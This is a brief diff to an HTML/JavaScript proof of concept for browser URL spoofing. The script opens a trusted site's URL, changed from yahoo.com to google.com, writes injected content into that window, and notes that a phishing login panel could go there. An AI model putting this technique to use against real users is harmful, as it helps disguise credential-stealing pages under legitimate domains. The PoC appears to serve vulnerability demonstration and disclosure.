@@ -1,7 +1,7 @@
 <script>
     function spoof() {
-        f1 = window.open('https://www.yahoo.com');
-        f1.document.write('<body><p>I am not landed in yahoo.com, this is just to demonstrate URL spoofing</p></body>');
+        nWindow = window.open('https:/www.google.com');
+        nWindow.document.write('<body><pre>Here we could place a phising login panel</pre></body>');
 }
 </script>
 <input type="button" onclick="spoof()" value="PoC!">
